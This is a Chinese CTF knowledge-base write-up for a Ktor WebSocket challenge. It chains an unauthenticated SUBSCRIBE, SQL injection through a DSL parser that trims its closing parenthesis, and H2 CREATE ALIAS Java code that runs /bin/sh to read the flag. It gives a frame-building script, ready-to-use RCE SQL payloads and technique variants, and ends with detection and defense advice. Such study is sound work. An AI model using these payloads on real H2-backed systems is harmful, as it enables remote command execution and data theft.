---
id: ctf-web-ktor-websocket-dsl-sqli-h2-create-alias
title: Ktor WebSocket 未授权订阅 + DSL SQL() 括号截断注入 H2，CREATE ALIAS 命令执行
type: scenario
domain: ctf
path: ctf/web
technique: ktor-dsl-sql-wrapper-h2-create-alias
tags:
- ctf
- web
- kotlin
- ktor
- websocket
- sqli
- h2
- create-alias
- parser-differential
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T01:59:42+08:00'
  notes: 已对照原文核对；空 SUBSCRIBE 授权、DSL SQL() 尾括号截断、H2 2.2.224 CREATE ALIAS 命令执行一致
url: /docs/ctf/web/ctf-web-ktor-websocket-dsl-sqli-h2-create-alias/
draft: false
kb_aliases:
- Ktor WebSocket 自定义协议
- NexusFrame 未授权订阅
- 知识图谱 DSL SQL 注入
- H2 2.2.224 CREATE ALIAS
- 括号截断解析差异
---

## 一句话结论

知识图谱协作平台的 Ktor WebSocket 入口在收到空订阅请求时直接签发带 read/query/export/import 权限的会话；QUERY 的自定义 DSL 把 `SQL()` 内容直接交给 H2 执行，而解析器会裁掉末尾一个右括号——在包装右括号前加空格即可保留查询末尾引号，构造任意 SQL；随后用 H2 2.2.224 的 `CREATE ALIAS` 定义 Java 方法执行 `/bin/sh -c`，以应用用户身份读 flag。

## 原理

- 入口是 `/ws/collab` 的 RFC6455 二进制 WebSocket。帧格式为魔数 `NXUS` + 1 字节 opcode + 大端 4 字节长度 + 载荷；opcode 对应 HELLO/AUTH/SUBSCRIBE/UPDATE/QUERY/EXPORT/IMPORT/RESULT。
- `SUBSCRIBE` 空请求即可获得带 `read/query/export/import` 权限的会话 token；并发时偶发订阅失败，重试即可，不需要利用竞态。
- QUERY 操作使用自定义 DSL（NODES.count、边计数、lookup、`SQL()`），其中 `SQL()` 把内容原样交给后端 H2 数据库执行。
- 解析器先 `trim` 输入，再丢弃最后一个右括号；因此把攻击载荷放在包装用的 `)` 前、并在 `)` 前留一个空格，被丢弃的就是包装右括号而不是载荷的结束引号，查询末尾的 `'` 得以保留，形成任意 SQL。
- H2 版本为 2.2.224；`CREATE ALIAS` 可以用 Java 源码定义函数，服务端具备运行期 `javac` 编译能力。先定义返回常量的别名证明代码执行，再定义为 `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd+" 2>&1"})` 的包装，`CALL` 后回显命令输出。
- 目标入口是详情接口里代理映射生成的公共地址（如 `1.14.76.59:19775`），题目描述中的私有地址 `192.168.6.217:8080` 是死隧道，TCP 可连但 HTTP/WebSocket 无响应。
- flag 文件由 root 只读保护，但 `/readflag` 是 setuid root 程序，执行它即可读出。

## 触发条件

- 目标为 Ktor/Java WebSocket 服务，使用自定义二进制帧协议，且 SUBSCRIBE 空请求即可获得高权限会话。
- QUERY DSL 暴露 `SQL()` 等把字符串直接送数据库的入口，且解析器存在“丢弃末尾右括号”的截断逻辑。
- 后端为 H2（本例 2.2.224），允许 `CREATE ALIAS` 且运行期可编译 Java。
- 应用用户可执行 `/readflag`（setuid）或能读取目标文件。
- 入口地址可达（注意代理/映射地址与私有地址的区别）。

## 利用步骤

1. 建立 WebSocket 握手，发送 `SUBSCRIBE` 空载荷，拿到会话 token；失败则重试。
2. 发送 `QUERY`：`SQL(SELECT ... )`，用报错/返回确认 SQL 执行；在包装 `)` 前留空格，保留载荷末尾引号。
3. 查询用户表拿到管理员 API token（本解法后续未使用，但可作为横向凭据）。
4. 验证 Java 编译：`SQL(CREATE ALIAS IF NOT EXISTS T AS 'int f(){return 42;}' )`，再 `SQL(CALL T() )`，返回 42。
5. 定义命令执行别名：`SQL(CREATE ALIAS IF NOT EXISTS EXEC AS 'String exec(String cmd) throws Exception { ... }' )`，再 `SQL(CALL EXEC('id') )`，回显 `uid=1000(appuser)`。
6. 执行 `/readflag` 读取 flag。

## PoC

WebSocket 帧构造（简化）：

```python
import os, struct, base64, socket, json

HOST, PORT = "target", 19775
MAGIC = b"NXUS"
OP = {"HELLO": 1, "AUTH": 2, "SUBSCRIBE": 3, "UPDATE": 4,
      "QUERY": 5, "EXPORT": 6, "IMPORT": 7, "RESULT": 8}

def nx(opcode, payload):
    if not isinstance(payload, (bytes, bytearray)):
        payload = json.dumps(payload).encode()
    return MAGIC + bytes([opcode]) + struct.pack(">I", len(payload)) + payload

# 省略 RFC6455 握手细节，可用 websockets/websocket-client 直接发送 binary 帧
# ws.send(nx(OP["SUBSCRIBE"], {}))
# ws.send(nx(OP["QUERY"], b"SQL(SELECT 1 )"))
```

H2 命令执行 SQL（注意 `SQL(` 包装右括号前的空格）：

```sql
SQL(CREATE ALIAS IF NOT EXISTS EXEC AS 'String exec(String cmd) throws Exception { Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd+" 2>&1"}); byte[] b = p.getInputStream().readAllBytes(); p.waitFor(); return new String(b, "UTF-8"); }' )
SQL(CALL EXEC('/readflag') )
```

## 变体与关联

- 括号截断也可用于其他 DSL 包装器：只要解析器丢弃末尾字符，就可在真正结束符前加空白/注释，保留注入载荷的引号或括号。
- H2 的 `CREATE ALIAS` 可换成 `RUNSCRIPT FROM`、`CSVREAD`、`LINKED TABLE` 等其它 H2 特性；不同版本对 Java 源码编译/沙箱限制不同。
- 若 `SQL()` 被过滤，可寻找 `lookup`、`export`、`import` 等其它拼接点；DSL 的节点/边查询也可能存在注入。
- 关联：H2 JDBC `INIT=CREATE ALIAS`、HSQLDB `CREATE ALIAS`、通用 SQLi 与 Java 命令执行卡。

## 检测与防御

- SUBSCRIBE 必须绑定已认证用户与显式权限，空请求不得签发高权限会话；查询/导出/导入分别授权。
- DSL 的 `SQL()` 只允许参数化查询或白名单模板，禁止把用户字符串直接交给数据库；对括号/引号做严格语法解析而不是截断字符串。
- H2 生产环境禁用 `CREATE ALIAS`、`RUNSCRIPT`、`CSVREAD` 等危险特性，数据库账号最小权限；移除运行期 javac 或使用只读沙箱。
- 不要把 `/readflag` 这类 setuid 程序留在 Web 应用可达路径；flag 权限分离。
- 检测：WebSocket 空 SUBSCRIBE、QUERY 中出现 `SQL(`/`CREATE ALIAS`/`CALL`/`Runtime`/`/bin/sh`、H2 日志出现别名创建、应用进程异常 fork `sh`。
